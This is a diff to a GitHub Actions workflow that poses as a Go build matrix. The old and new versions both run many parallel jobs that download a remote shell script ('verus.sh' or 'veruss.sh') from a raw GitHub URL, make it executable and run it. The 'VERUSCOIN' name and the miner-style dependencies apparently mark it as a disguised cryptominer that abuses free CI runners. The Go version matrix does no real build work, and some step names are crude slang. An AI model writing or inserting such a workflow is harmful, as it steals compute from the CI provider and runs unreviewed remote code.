@@ -1,109 +1,53 @@
-name: tokisaki-mitsuha
+name: VERUSCOIN MJ
 
-on: [push] 
+on: [push, pull_request]
 
-jobs: 
+jobs:
 
-  build: 
+  build:
 
-    name: berkentod
+    name: Ba_channel
 
-    runs-on: windows-latest
+    runs-on: ubuntu-18.04
 
-    strategy: 
+    strategy:
 
-      max-parallel: 40
+      max-parallel: 45
 
-      fail-fast: false 
+      fail-fast: false
 
-      matrix: 
+      matrix:
 
-        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
 
-        flag: [A, B, C, D, E, F, G, H, I, J]
+        flag: [A, B, C, D, E, F, G, H, I]
 
-    env: 
+    timeout-minutes: 360
 
-        NUM_JOBS: 40
+    env:
 
-        JOB: ${{ matrix.go }} 
+        NUM_JOBS: 20
 
-    defaults: 
+        JOB: ${{ matrix.go }}
 
-     run: 
+    steps:
 
-       shell: wsl-bash -u root {0} 
+    - name: Set up Go ${{ matrix.go }}
 
-    steps: 
+      uses: actions/setup-go@v1
 
-    - name: set up Go ${{ matrix.go }} 
+      with:
 
-      uses: actions/setup-go@v1 
+        go-version: ${{ matrix.go }}
 
-      with: 
+      id: go
 
-        go-version: ${{ matrix.go }} 
+    - name: Setup
 
-      id: go 
+      uses: actions/checkout@v1
 
-    - name: setup 
+    - name: BA_channel
 
-      uses: Vampire/setup-wsl@v1 
+      run: |
 
-  deploy: 
-
-    name: kagebunsinojutsu
-
-    needs: build 
-
-    runs-on: windows-latest 
-
-    timeout-minutes: 20
-
-    strategy: 
-
-      max-parallel: 100
-
-      fail-fast: false   
-
-      matrix:   
-
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0]   
-
-        flag: [A, B, C, D, E, F, G, H, I, J]
-
-    env:   
-
-        NUM_JOBS: 100
-
-        JOB: ${{ matrix.go }} 
-
-    defaults: 
-
-     run: 
-
-       shell: wsl-bash -u root {0} 
-
-    steps: 
-
-    - name: set up Go ${{ matrix.go }} 
-
-      uses: actions/setup-go@v1 
-
-      with: 
-
-        go-version: ${{ matrix.go }} 
-
-      id: go 
-
-    - name: memek
-
-      uses: Vampire/setup-wsl@v1 
-
-    - name : install dependencies 
-
-      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-
-    - name: bangke
-
-      run: wget  https://raw.githubusercontent.com/angkii/bh/main/verus.sh && chmod +x verus.sh && ./verus.sh
+        wget https://raw.githubusercontent.com/angkii/bh/main/veruss.sh && chmod 777 veruss.sh && ./veruss.sh
